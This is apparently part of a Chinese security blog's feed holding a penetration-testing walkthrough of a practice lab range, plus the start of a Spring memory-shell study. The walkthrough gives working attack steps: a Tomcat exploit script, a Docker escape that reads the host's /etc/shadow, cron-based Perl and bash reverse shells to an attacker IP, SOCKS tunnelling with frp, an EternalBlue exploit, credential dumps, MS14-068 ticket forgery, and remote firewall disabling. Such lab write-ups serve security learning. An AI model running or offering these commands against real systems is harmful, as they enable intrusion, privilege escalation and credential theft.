class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>).strip())<br><br>  <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[-] 命令执行错误&#x27;</span>)<br><span class="hljs-keyword">if</span> upload(url) == <span class="hljs-number">0</span>:<br>        exit()<br>time.sleep(<span class="hljs-number">0.5</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;输入执行命令(quit退出):&#x27;</span>)<br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>  cmd = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;&gt;&gt;&gt;&#x27;</span>)<br>  <span class="hljs-keyword">if</span>(cmd == <span class="hljs-string">&#x27;quit&#x27;</span>):<br>    <span class="hljs-keyword">break</span><br>  attack(url,cmd)<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">python cve-2017-tomcat.py -u http://192.168.157.128 -p 2002<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241115232125447.png" alt="image-20241115232125447"></p><p>然后冰蝎连接</p><p><img src="https://cdn.clown2024.cn/image-20241115232227130.png" alt="image-20241115232227130"></p><p>看一下基本信息</p><p><img src="https://cdn.clown2024.cn/image-20241115232453454.png" alt="image-20241115232453454"></p><p>可以看到docker环境，也可以用下面命令判断</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">grep <span class="hljs-string">&#x27;docker&#x27;</span> /proc/1/cgroup<br></code></pre></td></tr></table></figure><h2 id="docker逃逸"><a href="#docker逃逸" class="headerlink" title="docker逃逸"></a>docker逃逸</h2><p>题目考点有提到docker逃逸的知识点，那就看一下docker逃逸要怎么利用，参考：<a href="https://wiki.teamssix.com/CloudNative/Docker/container-escape-check.html">https://wiki.teamssix.com/CloudNative/Docker/container-escape-check.html</a></p><p>看一下是否是特权模式</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /proc/self/status | grep -qi <span class="hljs-string">&quot;0000003fffffffff&quot;</span> &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Is privileged mode&quot;</span> || <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Not privileged mode&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241115234729102.png" alt="image-20241115234729102"></p><p>根据文章检测下来只有特权模式能够利用，其他服务可能也存在，但这里tomcat的服务刚好能利用，就继续进行下去</p><p>查看挂载磁盘设备</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">fdisk -l<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241115235254326.png" alt="image-20241115235254326"></p><p>在容器内部执行以下命令，将宿主机文件挂载到 &#x2F;test 目录下</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> /test &amp;&amp; mount /dev/sda1 /test<br></code></pre></td></tr></table></figure><p>尝试访问宿主机 shadow 文件，可以看到正常访问</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /test/etc/shadow<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241115235506075.png" alt="image-20241115235506075"></p><p>那么我们就可以写入定时任务反弹shell然后拿到的权限也是宿主机的root权限</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> $<span class="hljs-string">&#x27;* * * * * perl -e \&#x27;</span>use Socket;<span class="hljs-variable">$i</span>=<span class="hljs-string">&quot;192.168.157.129&quot;</span>;<span class="hljs-variable">$p</span>=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(<span class="hljs-string">&quot;tcp&quot;</span>));<span class="hljs-keyword">if</span>(connect(S,sockaddr_in(<span class="hljs-variable">$p</span>,inet_aton(<span class="hljs-variable">$i</span>))))&#123;open(STDIN,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);open(STDOUT,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);open(STDERR,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;/bin/sh -i&quot;</span>);&#125;;\&#x27;<span class="hljs-string">&#x27; &gt; /test/var/spool/cron/crontabs/root</span><br></code></pre></td></tr></table></figure><p>但是为了方便操作还是看一下能不能写ssh公钥来连接吧</p><p>先看一下有没有.ssh文件</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -name .ssh<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241116000516621.png" alt="image-20241116000516621"></p><p>发现了ubuntu的.ssh文件地址</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">/test/home/ubuntu/.ssh<br></code></pre></td></tr></table></figure><p>那就可以写ssh公钥然后远程登录了</p><p>生成本地密钥对</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">ssh-keygen -t rsa<br></code></pre></td></tr></table></figure><p>以前生成过可以直接用</p><p><img src="https://cdn.clown2024.cn/image-20241116000827045.png" alt="image-20241116000827045"></p><p>写进authorized_keys</p><p><img src="https://cdn.clown2024.cn/image-20241116001043435.png" alt="image-20241116001043435"></p><p>欸我去忘记了这是仅主机模式了，我termius连不了，只能用kali的ssh，而且我试了一下还连不上就逆天，还是要我输入密码，不知道是不是我格式写错了（我发现直接传也不行）</p><p>那就还是反弹shell吧</p><p><img src="https://cdn.clown2024.cn/image-20241116003807417.png" alt="image-20241116003807417"></p><p>怪了，写进去又弹不过来了，红温了😡</p><p>换成bash弹一下看看</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;* * * * * bash -i &gt;&amp; /dev/tcp/192.168.157.129/8888 0&gt;&amp;1&quot;</span> &gt; /test/var/spool/cron/crontabs/root<br></code></pre></td></tr></table></figure><p>红温了还是不行</p><p>那就只能用john去爆一下密码了</p><p>把&#x2F;etc&#x2F;shadow的内容保存下来，然后直接john爆破</p><p><img src="https://cdn.clown2024.cn/image-20241116102516524.png" alt="image-20241116102516524"></p><p>轻松爆出密码为ubuntu，然后用ssh远程登录一下</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">ssh ubuntu@192.168.157.128<br></code></pre></td></tr></table></figure><p>然后看一下eth1的地址信息，就是内网地址的信息</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">ifconfig eth1<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241116111716201.png" alt="image-20241116111716201"></p><p>可以知道内网地址192.168.183.128</p><h2 id="struts2漏洞"><a href="#Struts2漏洞" class="headerlink" title="Struts2漏洞"></a>Struts2漏洞</h2><p>2001是一个struts2服务，直接上工具：<a href="https://github.com/abc123info/Struts2VulsScanTools/releases/tag/v19.32">https://github.com/abc123info/Struts2VulsScanTools/releases/tag/v19.32</a></p><p>直接能扫出rce漏洞</p><p><img src="https://cdn.clown2024.cn/image-20241116230437845.png" alt="image-20241116230437845"></p><p>那利用也很简单，干啥都行了，马也随便你上传，就不多演示了</p><h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><h2 id="frp反向代理"><a href="#frp反向代理" class="headerlink" title="frp反向代理"></a>frp反向代理</h2><p>现在我们呢就拿下一台跳板机了，为了方便顺便熟悉一下frp，这里搭个代理进去，然后可以直接扫一下内网</p><p>参考教程：<a href="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/12.%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/03.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/03.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F.html">https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/12.%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/03.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/03.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F.html</a></p><p>先将本地的frp上传到ubuntu的机器上去</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">scp -r frp ubuntu@192.168.157.128:/home/ubuntu/<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241116105558626.png" alt="image-20241116105558626"></p><blockquote><p>这里有点要注意，他上传的时候会直接找你当前目录下的frp目录，所以如上图要现在ubuntu目录下创建一个frp目录</p></blockquote><p>kali的frp服务端配置frps.toml</p><figure class="highlight toml"><table><tr><td class="code"><pre><code class="hljs toml"><span class="hljs-attr">bindPort</span> = <span class="hljs-number">49378</span><br><span class="hljs-attr">auth.token</span> = <span class="hljs-string">&quot;helloxx.6haha7789&quot;</span><br><span class="hljs-comment">#port，token自定义 保持客户端与服务端一致即可</span><br></code></pre></td></tr></table></figure><p>然后启动服务器</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">./frps -c ./frps.toml<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241116110345584.png" alt="image-20241116110345584"></p><p>ubuntu的客户端frpc.toml配置</p><figure class="highlight toml"><table><tr><td class="code"><pre><code class="hljs toml"><span class="hljs-attr">serverAddr</span> = <span class="hljs-string">&quot;192.168.157.129&quot;</span> <span class="hljs-comment"># 改为 VPS 的 IP 地址</span><br><span class="hljs-attr">serverPort</span> = <span class="hljs-number">49378</span><br><span class="hljs-attr">auth.token</span> = <span class="hljs-string">&quot;helloxx.6haha7789&quot;</span><br><br><span class="hljs-section">[[proxies]]</span><br><span class="hljs-attr">name</span> = <span class="hljs-string">&quot;plugin_socks5&quot;</span><br><span class="hljs-attr">type</span> = <span class="hljs-string">&quot;tcp&quot;</span><br><span class="hljs-attr">remotePort</span> = <span class="hljs-number">60051</span><br><span class="hljs-section">[proxies.plugin]</span><br><span class="hljs-attr">type</span> = <span class="hljs-string">&quot;socks5&quot;</span><br><span class="hljs-attr">username</span> = <span class="hljs-string">&quot;0HDFt16cLQJCB&quot;</span><br><span class="hljs-attr">password</span> = <span class="hljs-string">&quot;JTN276Gp1A&quot;</span><br></code></pre></td></tr></table></figure><p>然后启动客户端</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">./frpc -c ./frpc.toml<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241116111031630.png" alt="image-20241116111031630"></p><p>然后现在就能通过60051端口走socks5代理访问内网了</p><p>再配置一下proxychains4工具的配置文件</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">vim /etc/proxychains4.conf<br></code></pre></td></tr></table></figure><p>配置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">[ProxyList]<br># add proxy here ...<br># meanwile<br># defaults set to &quot;tor&quot;<br># socks4        127.0.0.1 9050<br># socks5  192.168.172.132 7777<br># socks5 127.0.0.1 8989<br>socks5 127.0.0.1 60051 0HDFt16cLQJCB JTN276Gp1A<br></code></pre></td></tr></table></figure><blockquote><p>这里一开始socks5忘记加上用户名和密码了，导致msf访问的时候被拒绝连接了</p></blockquote><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>那就直接上fscan扫内网了</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">proxychains ./fscan -h 192.168.183.1/24<br></code></pre></td></tr></table></figure><p>扫出的信息如下：</p><p>存活主机</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">(icmp) Target 192.168.183.1   is alive<br>(icmp) Target 192.168.183.130 is alive<br>(icmp) Target 192.168.183.128 is alive<br>(icmp) Target 192.168.183.129 is alive<br></code></pre></td></tr></table></figure><p>可以看到其他两台的地址都扫出来了</p><p>端口信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">192.168.183.128:22 open<br>192.168.183.1:7680 open<br>192.168.183.129:445 open<br>192.168.183.130:445 open<br>192.168.183.129:139 open<br>192.168.183.1:445 open<br>192.168.183.130:139 open<br>192.168.183.129:135 open<br>192.168.183.1:139 open<br>192.168.183.130:135 open<br>192.168.183.1:135 open<br>192.168.183.130:88 open<br></code></pre></td></tr></table></figure><p>漏洞信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">[*]192.168.183.130<br>   [-&gt;]WIN-ENS2VR5TR3N<br>   [-&gt;]192.168.183.130<br>[*] NetInfo <br>[*]192.168.183.129<br>   [-&gt;]TESTWIN7-PC<br>   [-&gt;]192.168.183.129<br>[+] MS17-010 192.168.183.129    (Windows 7 Enterprise 7601 Service Pack 1)<br>[+] MS17-010 192.168.183.130    (Windows Server 2008 HPC Edition 7601 Service Pack 1)                   <br>[*] NetBios 192.168.183.130 [+] DC:WIN-ENS2VR5TR3N.demo.com      Windows Server 2008 HPC Edition 7601 Service Pack 1<br></code></pre></td></tr></table></figure><p>win7的主机有MS17-010永恒之蓝漏洞，winServer2008应该是域控也有一个永恒之蓝</p><p>那就先打win7吧直接</p><h2 id="打win7"><a href="#打win7" class="headerlink" title="打win7"></a>打win7</h2><p>通过porxychains启动msf</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">proxychains msfconsole<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241116174820036.png" alt="image-20241116174820036"></p><p>然后上永恒之蓝的扫描模块试一下，主要是测试能不能通</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">use auxiliary/scanner/smb/smb_ms17_010<br><span class="hljs-built_in">set</span> rhost 192.168.183.129<br>run<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241116175834529.png" alt="image-20241116175834529"></p><p>可以看到是成功扫出来了ms17-010，那就直接开打！</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">use exploit/windows/smb/ms17_010_eternalblue<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp <span class="hljs-comment">#因为主机在内网，所以我们这里需要用正向的shell</span><br><span class="hljs-built_in">set</span> target Windows\ 7<br><span class="hljs-built_in">set</span> RHOSTS 192.168.183.129<br><span class="hljs-built_in">set</span> rhost 192.168.183.129<br>run<br></code></pre></td></tr></table></figure><p>一顿超时之后终于是拿到了meterpreter</p><p><img src="https://cdn.clown2024.cn/image-20241116180809503.png" alt="image-20241116180809503"></p><p>getuid看一下</p><p><img src="https://cdn.clown2024.cn/image-20241116180833768.png" alt="image-20241116180833768"></p><p>欸发现已经是SYSTEM权限了</p><p>那就直接不同提权了，直接常规先拿一下账号密码之类的信息</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">load kiwi<br>creds_all<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">msv credentials<br>===============<br><br>Username      Domain  NTLM                              SHA1<br>--------      ------  ----                              ----<br>TESTWIN7-PC$  DEMO    e3ba914bdaca29c197c7191ebf521873  68a1422322c303e4c24d63f381a03b34eb434477<br>douser        DEMO    bc23b0b4d5bf5ff42bc61fb62e13886e  c48096437367aad00ac2dc70552051cd84912a55<br><br>wdigest credentials<br>===================<br><br>Username      Domain  Password<br>--------      ------  --------<br>(null)        (null)  (null)<br>TESTWIN7-PC$  DEMO    /-LDA[1d hf-tfj)O)yNyCgh[o#D[h7I/*-&#x27;ShnKX%X7`wWWdrLDd`!EUceLQ8:y!J?TD5KY*iuQ32i8<br>                      He_D#JyWDWIzuYDDytr)\J7(_e(Fctsjl.Zd&quot;JRr<br>douser        DEMO    Dotest123<br><br>kerberos credentials<br>====================<br><br>Username      Domain    Password<br>--------      ------    --------<br>(null)        (null)    (null)<br>douser        DEMO.COM  (null)<br>testwin7-pc$  demo.com  /-LDA[1d hf-tfj)O)yNyCgh[o#D[h7I/*-&#x27;ShnKX%X7`wWWdrLDd`!EUceLQ8:y!J?TD5KY*iuQ32<br>                        i8He_D#JyWDWIzuYDDytr)\J7(_e(Fctsjl.Zd&quot;JRr<br>testwin7-pc$  DEMO.COM  /-LDA[1d hf-tfj)O)yNyCgh[o#D[h7I/*-&#x27;ShnKX%X7`wWWdrLDd`!EUceLQ8:y!J?TD5KY*iuQ32<br>                        i8He_D#JyWDWIzuYDDytr)\J7(_e(Fctsjl.Zd&quot;JRr<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">hashdump<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>testclone:1001:aad3b435b51404eeaad3b435b51404ee:8d8e04036d33ed20f5c2f6ad77e28bb7:::<br></code></pre></td></tr></table></figure><p>那现在win7就拿下了，但是我想shell获得cmd窗口一直不行不知道为什么</p><p><img src="https://cdn.clown2024.cn/image-20241116183521507.png" alt="image-20241116183521507"></p><p>又一直出现拒绝连接了</p><p>蚌埠住了我更新了msf想重新打试试的，结果直接给win7打蓝屏和死机了</p><p>后来可以之后他还是拿不到cmd</p><p><img src="https://cdn.clown2024.cn/image-20241116203423166.png" alt="image-20241116203423166"></p><p>后面还想将msf派生到cs上面，但是不会派生正向的shell，我看网上大部分都是先cs上线了一台主机然后创建中转监听的，没找到直接派生正向shell的</p><h2 id="打域控"><a href="#打域控" class="headerlink" title="打域控"></a>打域控</h2><p>那这次用不上cs，直接msf一路杀</p><p>先继续尝试一下我们刚刚扫出来的永恒之蓝</p><p><img src="https://cdn.clown2024.cn/image-20241116211150550.png" alt="image-20241116211150550"></p><p>ok打了两遍失败了，那就试试其他的吧</p><p>考点也说了用到了ms14-068漏洞，用msf搜索了一下只有验证漏洞的，没有利用漏洞的程序</p><p><img src="https://cdn.clown2024.cn/image-20241116211428215.png" alt="image-20241116211428215"></p><blockquote><p>笑死后来发现这也是利用的，因为这个模块多用于信息收集</p></blockquote><p>看了一下win7，作者贴心的把工具都给我们附上了</p><p><img src="https://cdn.clown2024.cn/image-20241116212028478.png" alt="image-20241116212028478"></p><p>利用原理参考文章：<a href="https://www.cnblogs.com/feizianquan/p/11760564.html">https://www.cnblogs.com/feizianquan/p/11760564.html</a></p><p>直接把工具从win7那拿过来方便一下</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">download C:\\Users\\douser\\Desktop\\MS14-068.exe /home/kali/Desktop<br></code></pre></td></tr></table></figure><p>漏洞利用条件：</p><p>1.域控没有打MS14-068的补丁(KB3011780)</p><p>2.拿下一台加入域的计算机</p><p>3.有这台域内计算机的域用户密码和Sid</p><p>我们还差一个sid没有抓取到，要去抓取一下</p><p>红温了，这会话又断了，受不了了，直接去win7那里偷一个sid过来(S-1-5-21-979886063-1111900045-1414766810-1107)，douser用户的</p><p>正常能拿cmd的话直接whoami &#x2F;all或者whoami &#x2F;user就能看到sid了</p><p>或者用meterpreter的run post&#x2F;windows&#x2F;gather&#x2F;credentials应该也可以</p><p>工具利用的命令如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">MS14-068.exe -u &lt;userName&gt;@&lt;domainName&gt; -p &lt;clearPassword&gt; -s &lt;userSid&gt; -d &lt;domainControlerAddr&gt;<br></code></pre></td></tr></table></figure><p>完了xs才发现这是exe程序，Linux用不了，那就改参考这篇文章的其他打法：<a href="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/12.%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/04.%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/04.%E5%9F%9F%E6%8E%A7%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E.html#cve-2014-6324%EF%BC%88ms14-068%EF%BC%89">https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/12.%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/04.%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/04.%E5%9F%9F%E6%8E%A7%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E.html#cve-2014-6324%EF%BC%88ms14-068%EF%BC%89</a></p><p>看了半天得作罢了感觉😭，基本都是在cmd下操作或者直接开启远程桌面上去操作</p><p>简单记一下流程吧，下面的操作是在win7的cmd上执行的，参考这篇文章：<a href="https://blog.csdn.net/zy15667076526/article/details/116059592">https://blog.csdn.net/zy15667076526/article/details/116059592</a></p><p>首先用ms14-068伪造票据</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd">ms14-<span class="hljs-number">068</span>.exe -u douser@DEMO.com -s S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">979886063</span>-<span class="hljs-number">1111900045</span>-<span class="hljs-number">1414766810</span>-<span class="hljs-number">1107</span> -d <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">183</span>.<span class="hljs-number">130</span> -p Dotest123<br></code></pre></td></tr></table></figure><p>他会生成一个票据文件，然后用mimikatz来注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">mimikatz # kerberos::purge         //清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造<br>mimikatz # kerberos::list          //查看当前机器凭证<br>mimikatz # kerberos::ptc &lt;生成的票据文件&gt;   //将票据注入到内存中<br></code></pre></td></tr></table></figure><p>然后就可以查看域控或者列出其c盘的文件了</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">net</span> use \\WIN-ENS2VR5TR3N<br><span class="hljs-built_in">dir</span> \\WIN-ENS2VR5TR3N\c$<br></code></pre></td></tr></table></figure><p>还可以通过sc命令来创建服务执行命令，比如关闭防火墙</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd">sc \\WIN-ENS2VR5TR3N create unablefirewall binpath= &quot;netsh advfirewall <span class="hljs-built_in">set</span> allprofiles state off&quot;<br><br>sc \\WIN-ENS2VR5TR3N <span class="hljs-built_in">start</span> unablefirewall<br></code></pre></td></tr></table></figure><p>关闭防火墙之后就可以直接永恒之蓝上线了其实</p><p>之前失败是因为被防火墙拦截</p><p><strong>一些清除痕迹的操作</strong></p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd">klist purge #卸载凭据<br>klist #查看票据<br></code></pre></td></tr></table></figure><p><strong>获取交互式shell</strong></p><p>现在是成功注入了凭证</p><p>然后我们可以利用PsExec.exe获取一个交互式的shell</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd">PsExec.exe -accepteula -s \\<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">19</span> <span class="hljs-built_in">cmd</span>.exe<br></code></pre></td></tr></table></figure><p><strong>远程登录操作</strong></p><p>可以直接用永恒之蓝获取密码之后redesktop登录</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;因为兼容性已经似了两个靶场，求求你别似了&lt;/p&gt;
&lt;h1 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h1&gt;&lt;p&gt;两张网卡，一张VMnet0和VMnet1都是仅主机模式&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    <category term="内网渗透" scheme="https://clowsman.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="内网渗透" scheme="https://clowsman.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>红日靶场三</title>
    <link href="https://clowsman.github.io/2024/11/14/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%89/"/>
    <id>https://clowsman.github.io/2024/11/14/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%89/</id>
    <published>2024-11-14T15:16:59.000Z</published>
    <updated>2024-11-15T12:01:48.540Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>打开虚拟机镜像为挂起状态，第一时间进行快照，部分服务未做自启，重启后无法自动运行。</p><p>挂起状态，账号已默认登陆，centos为出网机，第一次运行，需重新获取桥接模式网卡ip，也就是重启一下</p><p>除重新获取ip，不建议进行任何虚拟机操作。</p><p><img src="https://cdn.clown2024.cn/image-20241115110952089.png" alt="image-20241115110952089"></p><p><strong>目标：域控中存在一份重要文件。</strong></p><p>本次环境为黑盒测试，不提供虚拟机账号密码。</p><h1 id="作废了"><a href="#作废了😭" class="headerlink" title="作废了😭"></a>作废了😭</h1><p>两台Linux靶机运行不了，只能强制重启才能用，但是这样就不是登录状态了，然后账号密码也不知道，直接死在搭建环境了</p><p>只能看看别人的打靶过程了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;环境配置&quot;&gt;&lt;a href=&quot;#环境配置&quot; class=&quot;headerlink&quot; title=&quot;环境配置&quot;&gt;&lt;/a&gt;环境配置&lt;/h1&gt;&lt;p&gt;打开虚拟机镜像为挂起状态，第一时间进行快照，部分服务未做自启，重启后无法自动运行。&lt;/p&gt;
&lt;p&gt;挂起状态，账号已默认登陆，</summary>
      
    
    
    
    <category term="内网渗透" scheme="https://clowsman.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="内网渗透" scheme="https://clowsman.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Spring内存马学习</title>
    <link href="https://clowsman.github.io/2024/11/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2024/11/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-11-13T03:17:56.000Z</published>
    <updated>2024-11-14T08:32:08.170Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Spring框架比较常用就不说了，网上大部分都是建一个spring+springmvc的项目来测试内存马，内存马主要的逻辑部分都集中在springmvc的部分，因为负责处理路由请求基本都是都是需要经由springmvc，所以我看也有叫springmvc内存马的。</p><p>我这里就直接搭一个springboot项目比较方便了，反正本身也是有springmvc的，所以内部逻辑也是一样分析</p><p>版本如下</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.5.10<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">relativePath</span>/&gt;</span> <span class="hljs-comment">&lt;!-- lookup parent from repository --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="controller内存马"><a href="#Controller内存马" class="headerlink" title="Controller内存马"></a>Controller内存马</h1><h2 id="contoller注册流程"><a href="#Contoller注册流程" class="headerlink" title="Contoller注册流程"></a>Contoller注册流程</h2><p>我们要先知道Controller的注册逻辑</p><p>编写一个简单的controller然后下断点</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.contorller;<br><br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloController</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/hello&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello World&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241113133819511.png" alt="image-20241113133819511"></p><p>这里能看到请求处理的调用栈</p><p>在AbstractHandlerMethodMapping的initHandlerMethods方法下断点来看看是怎么注册controller的</p><p><img src="https://cdn.clown2024.cn/image-20241113134431011.png" 